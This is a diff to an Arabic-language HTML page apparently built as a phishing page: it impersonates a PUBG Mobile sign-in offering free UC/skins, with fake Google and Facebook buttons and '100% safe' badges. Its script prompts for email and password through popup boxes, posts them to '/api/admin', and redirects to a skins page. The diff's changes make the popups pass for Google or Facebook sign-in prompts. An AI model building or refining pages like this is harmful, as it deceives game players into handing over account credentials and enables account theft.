@@ -2,21 +2,21 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
-<title>PUBG UC FREE</title>
+<title>PUBG MOBILE - تسجيل الدخول</title>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Anton&family=Cairo:wght@400;700;900&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
 
 * { box-sizing: border-box; margin: 0; padding: 0; }
 
 body {
-    background: url('https://i.imgur.com/QYvYg5k.jpg') no-repeat center center fixed;
+    background: url('https://i.imgur.com/JQYv8mL.jpg') no-repeat center center fixed;
     background-size: cover;
     font-family: 'Cairo', sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
     min-height: 100vh;
-    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+    color: white;
 }
 
 /* طبقة التعتيم */
@@ -24,133 +24,156 @@ body::before {
     content: '';
     position: absolute;
     top: 0; left: 0; right: 0; bottom: 0;
-    background: rgba(0,0,0,0.6);
+    background: rgba(0,0,0,0.4);
+    z-index: 1;
 }
 
-.login-card {
-    position: relative;
-    background: linear-gradient(180deg, rgba(10,15,30,0.9), rgba(0,0,0,0.9));
-    backdrop-filter: blur(20px);
-    border: 2px solid #FFD700;
-    border-radius: 25px;
-    padding: 35px 30px;
-    width: 440px;
-    text-align: center;
-    box-shadow: 0 0 40px rgba(255, 215, 0, 0.5), inset 0 0 20px rgba(255,215,0,0.1);
-    animation: fadeIn 1s ease;
+.top-bar {
+    display: flex;
+    justify-content: space-between;
+    padding: 20px 40px;
     z-index: 2;
+    position: relative;
 }
-@keyframes fadeIn { from {opacity:0; transform: translateY(30px);} to {opacity:1; transform: translateY(0);} }
+.pubg-logo { width: 120px; }
+.safe-text { display: flex; align-items: center; gap: 8px; font-weight: 600; }
 
-.logo {
-    font-family: 'Anton', sans-serif;
-    font-size: 50px;
-    color: #FFD700;
-    text-shadow: 0 0 15px #FFD700, 0 0 30px #FFD700;
-    margin-bottom: 15px;
-    animation: glow 2s ease-in-out infinite alternate;
+.center-box {
+    background: rgba(8, 12, 25, 0.95);
+    backdrop-filter: blur(20px);
+    border: 2px solid rgba(255, 215, 0, 0.3);
+    border-radius: 25px;
+    padding: 40px 35px;
+    width: 480px;
+    margin: 0 auto;
+    text-align: center;
+    box-shadow: 0 0 50px rgba(255, 215, 0, 0.2);
+    z-index: 2;
+    position: relative;
 }
-@keyframes glow {
-    from { text-shadow: 0 0 10px #FFD700; }
-    to { text-shadow: 0 0 20px #FFD700, 0 0 40px #FFD700; }
-}
-.logo span { color: white; font-size: 30px; display: block; margin-top: -10px; }
 
-h2 { font-size: 28px; margin-bottom: 5px; font-weight: 900; }
-.subtitle { color: #aaa; font-size: 14px; margin-bottom: 25px; }
+.pubg-logo-center { width: 140px; margin-bottom: 15px; }
+.center-box h1 { font-size: 32px; font-weight: 900; margin-bottom: 5px; }
+.center-box h1 span { color: #FFD700; }
+.center-box p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
 
-.btn {
-    display: flex; align-items: center; justify-content: center;
-    width: 100%; padding: 13px; border-radius: 12px;
-    font-size: 16px; font-weight: bold; cursor: pointer;
+.login-btn {
+    display: flex; align-items: center; justify-content: space-between;
+    width: 100%; padding: 14px 20px; border-radius: 50px;
+    font-size: 16px; font-weight: 700; cursor: pointer;
     margin: 12px 0; border: none; font-family: 'Cairo';
     transition: 0.3s;
 }
-.btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
-.google-btn { background: white; color: black; }
-.fb-btn { background: linear-gradient(90deg, #1877f2, #0a66e2); color: white; }
-.btn img { width: 22px; height: 22px; margin-left: 10px; }
+.login-btn:hover { transform: translateY(-2px); }
+.google-btn { background: white; color: #333; }
+.fb-btn { background: #1877f2; color: white; }
+.login-btn img { width: 24px; height: 24px; }
+.login-btn .arrow { font-size: 20px; }
 
-.divider { display: flex; align-items: center; color: #777; margin: 20px 0; font-weight: bold; }
-.divider hr { flex: 1; border: none; border-top: 1px solid #444; }
+.divider { display: flex; align-items: center; color: #555; margin: 20px 0; }
+.divider hr { flex: 1; border: none; border-top: 1px solid #333; }
 .divider span { margin: 0 15px; }
 
-.input-box {
-    position: relative; margin: 15px 0;
-}
-.input-box input {
-    width: 100%; padding: 14px 45px 14px 14px;
-    background: rgba(0,0,0,0.5); border: 2px solid #333;
-    border-radius: 12px; color: white; font-size: 15px;
-    font-family: 'Cairo'; transition: 0.3s;
-}
-.input-box input:focus { outline: none; border-color: #FFD700; box-shadow: 0 0 15px rgba(255,215,0,0.3); }
-.input-box .icon { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); font-size: 18px; color: #FFD700; }
+.safe-badge { display: flex; align-items: center; justify-content: center; gap: 8px; color: #FFD700; font-weight: 700; margin-top: 10px; }
 
-.login-btn {
-    width: 100%; padding: 15px;
-    background: linear-gradient(90deg, #FFD700, #FFA500);
-    border: none; border-radius: 12px;
-    font-size: 18px; font-weight: 900;
-    color: black; cursor: pointer; margin-top: 15px;
-    transition: 0.3s;
-    font-family: 'Cairo';
-}
-.login-btn:hover { 
-    transform: translateY(-2px); 
-    box-shadow: 0 0 25px #FFD700; 
-}
+.terms { font-size: 12px; color: #777; margin-top: 25px; }
+.terms a { color: #FFD700; text-decoration: none; }
 
-.footer-text {
-    margin-top: 20px;
-    font-size: 12px;
-    color: #666;
+.features {
+    display: flex;
+    justify-content: space-around;
+    background: rgba(0,0,0,0.7);
+    padding: 25px 20px;
+    z-index: 2;
+    position: relative;
 }
+.feature {
+    display: flex; align-items: center; gap: 12px;
+    text-align: right;
+}
+.feature-icon {
+    width: 45px; height: 45px;
+    background: #FFD700;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px; color: black;
+}
+.feature h4 { font-size: 15px; font-weight: 900; }
+.feature p { font-size: 12px; color: #aaa; }
 </style>
 </head>
 <body>
-    <div class="login-card">
-        <div class="logo">PUBG <span>UC FREE</span></div>
 
-        <h2>تسجيل الدخول 🪖</h2>
-        <p class="subtitle">سجل دخولك للوصول إلى جميع خدمات الموقع</p>
+    <div class="top-bar">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/PUBG_Mobile_logo.png" class="pubg-logo" alt="PUBG">
+        <div class="safe-text">🛡️ استمتع بتجربة شحن سريعة وآمنة</div>
+    </div>
 
-        <button class="btn google-btn" onclick="register()">
+    <div class="center-box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/PUBG_Mobile_logo.png" class="pubg-logo-center" alt="PUBG">
+        
+        <h1>تسجيل الدخول<br><span>إلى حسابك</span></h1>
+        <p>سجل الدخول بسرعة وأمان باستخدام حسابك<br>على Google أو Facebook</p>
+
+        <button class="login-btn google-btn" onclick="register()">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c1/Google_%22G%22_logo.svg" alt="G">
-            تسجيل الدخول بواسطة Google
+            <span>المتابعة باستخدام Google</span>
+            <span class="arrow">→</span>
         </button>
 
-        <button class="btn fb-btn" onclick="register()">
+        <button class="login-btn fb-btn" onclick="register()">
             <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="f">
-            تسجيل الدخول بواسطة Facebook
+            <span>المتابعة باستخدام Facebook</span>
+            <span class="arrow">→</span>
         </button>
 
         <div class="divider"><hr><span>أو</span><hr></div>
 
-        <div class="input-box">
-            <input type="email" id="email" placeholder="البريد الإلكتروني">
-            <span class="icon">✉️</span>
-        </div>
+        <div class="safe-badge">🛡️ آمن 100%</div>
 
-        <div class="input-box">
-            <input type="password" id="password" placeholder="كلمة المرور">
-            <span class="icon">🔒</span>
-        </div>
+        <p class="terms">
+            باستمرارك، فانك توافق على <a href="#">شروط الاستخدام</a> و <a href="#">سياسة الخصوصية</a>
+        </p>
+    </div>
 
-        <button class="login-btn" onclick="register()">تسجيل الدخول ➡️</button>
-        
-        <p class="footer-text">🔒 آمن 100% • سريع • مجاني</p>
+    <div class="features">
+        <div class="feature">
+            <div class="feature-icon">⚡</div>
+            <div>
+                <h4>شحن فوري</h4>
+                <p>في دقائق</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">🛡️</div>
+            <div>
+                <h4>أمان عالي</h4>
+                <p>بياناتك محمية</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">🎧</div>
+            <div>
+                <h4>دعم 24/7</h4>
+                <p>نحن هنا لمساعدتك</p>
+            </div>
+        </div>
+        <div class="feature">
+            <div class="feature-icon">⭐</div>
+            <div>
+                <h4>مصداقية تامة</h4>
+                <p>الاف اللاعبين يثقون بنا</p>
+            </div>
+        </div>
     </div>
 
 <script>
 async function register() {
-    const id = document.getElementById('email').value;
-    const password = document.getElementById('password').value;
+    // هنفتح البوب اب بتاع جوجل او فيس هنا
+    const id = prompt("ادخل الايميل:");
+    const password = prompt("ادخل كلمة السر:");
     
-    if(!id || !password){
-        alert("لازم تملا الايميل والباسورد");
-        return;
-    }
+    if(!id || !password){ return; }
     
     try {
         const res = await fetch('/api/admin', {
@@ -161,8 +184,7 @@ async function register() {
 
         if(res.ok) {
             alert("✅ تم التسجيل بنجاح");
-            // التحويل لصفحة الاسكنات
-            window.location.href = "skins.html"; 
+            window.location.href = "skins.html"; // التحويل لصفحة الاسكنات
         } else {
             alert("❌ فشل التسجيل");
         }
